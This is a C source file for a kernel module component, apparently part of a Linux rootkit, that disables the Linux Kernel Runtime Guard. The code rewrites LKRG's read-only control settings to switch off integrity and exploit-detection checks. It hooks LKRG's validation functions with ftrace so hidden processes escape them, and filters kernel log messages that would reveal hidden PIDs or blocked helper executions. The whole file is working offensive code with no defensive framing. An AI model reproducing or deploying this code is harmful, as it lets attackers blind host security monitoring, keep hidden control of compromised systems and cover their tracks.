#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/lkrg_bypass.h"

static atomic_t hooks_active = ATOMIC_INIT(0);
static atomic_t umh_bypass_active = ATOMIC_INIT(0);
static struct notifier_block module_notifier;

#define LKRG_SETUP_DELAY_MS 1000

static char lkrg_log_buf[512];
static DEFINE_SPINLOCK(lkrg_log_lock);

static const char *lkrg_symbols[] = {
    "p_ro",
    "p_cmp_creds",
    "p_check_integrity",
    NULL
};

struct lkrg_ctrl_conf {
#if defined(CONFIG_X86)
    unsigned int p_smep_validate;
    unsigned int p_smap_validate;
#endif
    unsigned int p_pcfi_validate;
    unsigned int p_pint_validate;
    unsigned int p_kint_validate;
    unsigned int p_log_level;
    unsigned int p_block_modules;
    unsigned int p_msr_validate;
    unsigned int p_heartbeat;
    unsigned int p_interval;
    unsigned int p_umh_validate;
#if defined(CONFIG_X86)
    unsigned int p_smep_enforce;
    unsigned int p_smap_enforce;
#endif
    unsigned int p_pcfi_enforce;
    unsigned int p_pint_enforce;
    unsigned int p_kint_enforce;
    unsigned int p_trigger;
    unsigned int p_hide_lkrg;
    unsigned int p_umh_enforce;
    unsigned int p_profile_validate;
    unsigned int p_profile_enforce;
};

struct lkrg_ro_view {
#if !defined(CONFIG_ARM) && defined(CONFIG_X86)
    unsigned long marker_np1 __attribute__((aligned(PAGE_SIZE)));
#endif
    struct {
        struct lkrg_ctrl_conf ctrl;
    } p_lkrg_global_ctrl __attribute__((aligned(PAGE_SIZE)));
};

static struct lkrg_ctrl_conf saved_lkrg_ctrl;
static struct lkrg_ctrl_conf *lkrg_ctrl;
static bool lkrg_ctrl_saved;
static int (*set_memory_rw_fn)(unsigned long addr, int numpages);
static int (*set_memory_ro_fn)(unsigned long addr, int numpages);
static void lkrg_setup_workfn(struct work_struct *work);
static DECLARE_DELAYED_WORK(lkrg_setup_work, lkrg_setup_workfn);

static notrace bool lkrg_ctrl_plausible(struct lkrg_ctrl_conf *ctrl)
{
    if (!ctrl)
        return false;

    if (ctrl->p_pcfi_validate > 9 || ctrl->p_pint_validate > 9 ||
        ctrl->p_kint_validate > 9 || ctrl->p_umh_validate > 9 ||
        ctrl->p_pcfi_enforce > 9 || ctrl->p_pint_enforce > 9 ||
        ctrl->p_kint_enforce > 9 || ctrl->p_umh_enforce > 9 ||
        ctrl->p_profile_validate > 9 || ctrl->p_profile_enforce > 9 ||
        ctrl->p_log_level > 9)
        return false;

    return true;
}

static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void)
{
    void *ro = resolve_sym("p_ro");
    struct lkrg_ctrl_conf *ctrl;

    if (!ro)
        return NULL;

    ctrl = &((struct lkrg_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
    if (lkrg_ctrl_plausible(ctrl))
        return ctrl;

    ctrl = (struct lkrg_ctrl_conf *)ro;
    if (lkrg_ctrl_plausible(ctrl))
        return ctrl;

    return NULL;
}

static notrace bool lkrg_ctrl_make_rw(void *addr)
{
    unsigned long page = (unsigned long)addr & PAGE_MASK;

    if (!set_memory_rw_fn)
        set_memory_rw_fn = (void *)resolve_sym("set_memory_rw");
    if (!set_memory_rw_fn)
        return false;

    return set_memory_rw_fn(page, 1) == 0;
}

static notrace void lkrg_ctrl_make_ro(void *addr)
{
    unsigned long page = (unsigned long)addr & PAGE_MASK;

    if (!set_memory_ro_fn)
        set_memory_ro_fn = (void *)resolve_sym("set_memory_ro");
    if (set_memory_ro_fn)
        set_memory_ro_fn(page, 1);
}

static notrace bool lkrg_relax_controls(void)
{
    struct lkrg_ctrl_conf *ctrl;

    ctrl = lkrg_find_ctrl();
    if (!ctrl)
        return false;
    lkrg_ctrl = ctrl;

    if (!ctrl->p_pint_validate && !ctrl->p_pint_enforce &&
        !ctrl->p_pcfi_validate && !ctrl->p_pcfi_enforce &&
        !ctrl->p_umh_validate && !ctrl->p_umh_enforce)
        return true;

    if (!lkrg_ctrl_saved) {
        memcpy(&saved_lkrg_ctrl, ctrl, sizeof(saved_lkrg_ctrl));
        lkrg_ctrl_saved = true;
    }

    if (!lkrg_ctrl_make_rw(ctrl))
        return false;

    WRITE_ONCE(ctrl->p_pint_validate, 0);
    WRITE_ONCE(ctrl->p_pint_enforce, 0);
    WRITE_ONCE(ctrl->p_pcfi_validate, 0);
    WRITE_ONCE(ctrl->p_pcfi_enforce, 0);
    WRITE_ONCE(ctrl->p_umh_validate, 0);
    WRITE_ONCE(ctrl->p_umh_enforce, 0);
    lkrg_ctrl_make_ro(ctrl);

    return true;
}

static notrace void lkrg_restore_controls(void)
{
    if (!lkrg_ctrl || !lkrg_ctrl_saved)
        return;

    lkrg_ctrl_make_rw(lkrg_ctrl);
    WRITE_ONCE(lkrg_ctrl->p_pint_validate, saved_lkrg_ctrl.p_pint_validate);
    WRITE_ONCE(lkrg_ctrl->p_pint_enforce, saved_lkrg_ctrl.p_pint_enforce);
    WRITE_ONCE(lkrg_ctrl->p_pcfi_validate, saved_lkrg_ctrl.p_pcfi_validate);
    WRITE_ONCE(lkrg_ctrl->p_pcfi_enforce, saved_lkrg_ctrl.p_pcfi_enforce);
    WRITE_ONCE(lkrg_ctrl->p_umh_validate, saved_lkrg_ctrl.p_umh_validate);
    WRITE_ONCE(lkrg_ctrl->p_umh_enforce, saved_lkrg_ctrl.p_umh_enforce);
    lkrg_ctrl_make_ro(lkrg_ctrl);
}

static notrace bool is_lkrg_present(void)
{
    int i, found = 0;
    for (i = 0; lkrg_symbols[i] != NULL; i++) {
        if (resolve_sym(lkrg_symbols[i]) != NULL)
            found++;
    }
    return (found >= 2);
}

static notrace bool is_lineage_hidden(struct task_struct *task)
{
    int depth = 0;
    struct task_struct *parent;
    
    if (!task) task = current;
    if (!task) return false;
    
    while (task && depth < 64) {
        if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
            is_child_pid(task->pid) || is_child_pid(task->tgid))
            return true;
        
        parent = task->real_parent;
        if (!parent || parent == task || task->pid <= 1)
            break;
        task = parent;
        depth++;
    }
    return false;
}

static notrace bool should_hide_task(struct task_struct *task)
{
    return task ? is_lineage_hidden(task) : false;
}

static notrace bool should_skip_lkrg_ed(void)
{
    lkrg_relax_controls();

    if (atomic_read(&umh_bypass_active) > 0)
        return true;

    return should_hide_task(current);
}

static notrace pid_t extract_pid_from_log(const char *msg)
{
    const char *p;
    pid_t pid = 0;
    
    if (!msg) return 0;
    
    p = strstr(msg, "pid ");
    if (!p) p = strstr(msg, "Killing pid ");
    if (!p) return 0;
    
    while (*p && (*p < '0' || *p > '9')) p++;
    while (*p >= '0' && *p <= '9') {
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return pid;
}

static notrace bool should_filter_log(const char *msg)
{
    pid_t pid;
    int i;
    
    if (!msg || !strstr(msg, "LKRG")) return false;
    
    if (atomic_read(&umh_bypass_active) > 0) {
        if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
            strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
            return true;
    }
    
    pid = extract_pid_from_log(msg);
    if (pid > 0) {
        for (i = 0; i < hidden_count && i < MAX_HIDDEN_PIDS; i++)
            if (hidden_pids[i] == pid) return true;
        for (i = 0; i < child_count && i < MAX_CHILD_PIDS; i++)
            if (child_pids[i] == pid) return true;
    }
    
    return false;
}

static asmlinkage int (*orig_vprintk_emit)(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args) = NULL;

static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args)
{
    unsigned long flags;
    va_list args_copy;
    bool filter = false;
    int len = 0;
    
    if (!orig_vprintk_emit || !fmt) 
        return orig_vprintk_emit ? orig_vprintk_emit(facility, level, dev_info, fmt, args) : 0;
    
    if (!strstr(fmt, "LKRG") && !strstr(fmt, "lkrg") && !strstr(fmt, "p_lkrg"))
        return orig_vprintk_emit(facility, level, dev_info, fmt, args);
    
    spin_lock_irqsave(&lkrg_log_lock, flags);
    va_copy(args_copy, args);
    len = vsnprintf(lkrg_log_buf, sizeof(lkrg_log_buf) - 1, fmt, args_copy);
    va_end(args_copy);
    lkrg_log_buf[sizeof(lkrg_log_buf) - 1] = '\0';
    filter = should_filter_log(lkrg_log_buf);
    spin_unlock_irqrestore(&lkrg_log_lock, flags);
    
    if (filter) return len;
    return orig_vprintk_emit(facility, level, dev_info, fmt, args);
}

static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;

static notrace int hook_call_usermodehelper_exec_async(void *data)
{
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;

    lkrg_relax_controls();
    
    if (bypass_active) {
        add_hidden_pid(current->pid);
        add_child_pid(current->pid);
    }
    
    return orig_call_usermodehelper_exec_async ?
        orig_call_usermodehelper_exec_async(data) : 0;
}

static int (*orig_call_usermodehelper_exec)(struct subprocess_info *sub_info, int wait) = NULL;

static notrace int hook_call_usermodehelper_exec(struct subprocess_info *sub_info, int wait)
{
    int ret;
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;

    lkrg_relax_controls();
    
    if (bypass_active) {
        add_hidden_pid(current->pid);
    }
    
    ret = orig_call_usermodehelper_exec ? 
        orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
    
    return ret;
}

static void (*orig_p_ed_enforce_validation)(void) = NULL;

static notrace void hook_p_ed_enforce_validation(void)
{
    if (should_skip_lkrg_ed())
        return;

    if (orig_p_ed_enforce_validation)
        orig_p_ed_enforce_validation();
}

static unsigned int (*orig_p_ed_enforce_validation_paranoid)(void) = NULL;

static notrace unsigned int hook_p_ed_enforce_validation_paranoid(void)
{
    if (atomic_read(&umh_bypass_active) > 0 || hidden_pid_count() > 0 || child_pid_count() > 0)
        return 0;

    return orig_p_ed_enforce_validation_paranoid ?
        orig_p_ed_enforce_validation_paranoid() : 0;
}

static void (*orig_p_ed_validate_current)(void *p_source) = NULL;

static notrace void hook_p_ed_validate_current(void *p_source)
{
    if (should_skip_lkrg_ed())
        return;

    if (orig_p_ed_validate_current)
        orig_p_ed_validate_current(p_source);
}

static void (*orig_p_ed_validate_off_flag_wrap)(void *p_source) = NULL;

static notrace void hook_p_ed_validate_off_flag_wrap(void *p_source)
{
    if (should_skip_lkrg_ed())
        return;

    if (orig_p_ed_validate_off_flag_wrap)
        orig_p_ed_validate_off_flag_wrap(p_source);
}

static int (*orig_p_ed_enforce_pcfi)(struct task_struct *task, void *orig,
    struct pt_regs *regs) = NULL;

static notrace int hook_p_ed_enforce_pcfi(struct task_struct *task, void *orig,
    struct pt_regs *regs)
{
    if (atomic_read(&umh_bypass_active) > 0 || should_hide_task(task ? task : current))
        return 0;

    return orig_p_ed_enforce_pcfi ?
        orig_p_ed_enforce_pcfi(task, orig, regs) : 0;
}

static struct ftrace_hook lkrg_hooks[] = {
    HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit),
    HOOK("call_usermodehelper_exec_async", hook_call_usermodehelper_exec_async, &orig_call_usermodehelper_exec_async),
    HOOK("call_usermodehelper_exec", hook_call_usermodehelper_exec, &orig_call_usermodehelper_exec),
    HOOK("p_ed_enforce_validation", hook_p_ed_enforce_validation, &orig_p_ed_enforce_validation),
    HOOK("p_ed_enforce_validation_paranoid", hook_p_ed_enforce_validation_paranoid, &orig_p_ed_enforce_validation_paranoid),
    HOOK("p_ed_validate_current", hook_p_ed_validate_current, &orig_p_ed_validate_current),
    HOOK("p_ed_validate_off_flag_wrap", hook_p_ed_validate_off_flag_wrap, &orig_p_ed_validate_off_flag_wrap),
    HOOK("p_ed_enforce_pcfi", hook_p_ed_enforce_pcfi, &orig_p_ed_enforce_pcfi),
};

static notrace int try_install_hooks(void)
{
    int i, installed = 0;
    
    for (i = 0; i < ARRAY_SIZE(lkrg_hooks); i++) {
        if (lkrg_hooks[i].address)
            continue;
        if (fh_install_hook(&lkrg_hooks[i]) == 0)
            installed++;
    }
    
    if (installed > 0) {
        atomic_set(&hooks_active, 1);
        return 0;
    }
    return -ENOENT;
}

static notrace void remove_hooks(void)
{
    int i;
    for (i = ARRAY_SIZE(lkrg_hooks) - 1; i >= 0; i--) {
        if (lkrg_hooks[i].address)
            fh_remove_hook(&lkrg_hooks[i]);
    }
    atomic_set(&hooks_active, 0);
}

static void lkrg_setup_workfn(struct work_struct *work)
{
    if (!is_lkrg_present())
        return;

    lkrg_relax_controls();
    try_install_hooks();
    lkrg_relax_controls();
}

static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data)
{
    struct module *mod = data;
    
    if (!mod) return NOTIFY_DONE;

    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg"))
        schedule_delayed_work(&lkrg_setup_work, msecs_to_jiffies(LKRG_SETUP_DELAY_MS));

    return NOTIFY_DONE;
}

notrace void enable_umh_bypass(void)
{
    atomic_inc(&umh_bypass_active);
}
EXPORT_SYMBOL(enable_umh_bypass);

notrace void disable_umh_bypass(void)
{
    if (atomic_read(&umh_bypass_active) > 0)
        atomic_dec(&umh_bypass_active);
}
EXPORT_SYMBOL(disable_umh_bypass);

notrace bool is_lkrg_blinded(void)
{
    return atomic_read(&hooks_active) > 0;
}

notrace int lkrg_bypass_init(void)
{
    module_notifier.notifier_call = module_notify;
    register_module_notifier(&module_notifier);

    lkrg_setup_workfn(NULL);
    
    return 0;
}

notrace void lkrg_bypass_exit(void)
{
    cancel_delayed_work_sync(&lkrg_setup_work);
    unregister_module_notifier(&module_notifier);
    remove_hooks();
    lkrg_restore_controls();
    atomic_set(&umh_bypass_active, 0);
}
